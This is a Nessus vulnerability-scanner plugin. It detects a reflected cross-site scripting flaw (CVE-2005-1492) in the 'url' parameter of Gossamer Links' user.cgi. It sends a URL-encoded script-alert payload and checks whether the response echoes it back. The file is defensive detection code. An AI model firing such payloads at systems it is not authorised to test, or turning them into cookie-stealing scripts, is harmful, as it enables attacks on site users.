#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description) {
  script_id(19234);
  script_version("$Revision: 1.17 $");

  script_cve_id("CVE-2005-1492");
  script_bugtraq_id(13484);
  script_osvdb_id(16189);

  script_name(english:"Gossamer Threads Links user.cgi url Parameter XSS");
 
 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a CGI script that is susceptible to a
cross-site scripting attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running Gossamer Links, a web links management tool
from Gossamer Threads and written in Perl. 

The installed version of Gossamer Links fails to properly sanitize
user-supplied input to the 'url' parameter of the 'user.cgi' script. 
By leveraging this flaw, an attacker may be able to cause arbitrary
HTML and script code to be executed by a user's browser within the
context of the affected application, leading to cookie theft and
similar attacks." );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=111531023916998&w=2" );
  # http://www.gossamer-threads.com/forum/Gossamer_Links_3.0.1_Released_P280986/
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?a19428ee" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to Gossamer Links 3.0.1 or later." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:U/RC:ND");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_cwe_id(20, 74, 79, 442, 629, 711, 712, 722, 725, 750, 751, 800, 801, 809, 811, 864, 900, 928, 931, 990);

 script_set_attribute(attribute:"plugin_publication_date", value: "2005/07/20");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/05/04");
 script_cvs_date("$Date: 2015/01/13 20:37:05 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_set_attribute(attribute:"cpe", value:"cpe:/a:gossamer_threads:gossamer_threads_links-sql");
script_end_attributes();

 
  script_summary(english:"Checks for url parameter cross-site scripting vulnerability in Gossamer Links");
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
  script_copyright(english:"This script is Copyright (C) 2005-2015 Tenable Network Security, Inc.");
  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}

include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80);
if (get_kb_item("www/" + port + "/generic_xss")) exit(0);


# A simple alert.
xss = '<script>alert("' + SCRIPT_NAME + '");</script>';
# nb: the url-encoded version is what we need to pass in.
exss = '%3Cscript%3Ealert("' + SCRIPT_NAME + '")%3B%3C%2Fscript%3E';


# Loop through CGI directories.
foreach dir (cgi_dirs()) {
  # Try to exploit the flaw.
  r = http_send_recv3(method: "GET", port: port, 
    item:string(
      dir, "/user.cgi?",
      'url=">', exss, "&",
      "from=add"
    ));
  if (isnull(r)) exit(0);

  # There's a problem if ...
  if (
    # it looks like Gossamer Links and...
    '<input type="hidden" name="url" value="">' >< r[2] &&
    # we see our XSS.
    xss >< r[2]
  ) {
    security_warning(port);
    set_kb_item(name: 'www/'+port+'/XSS', value: TRUE);
    exit(0);
  }
}
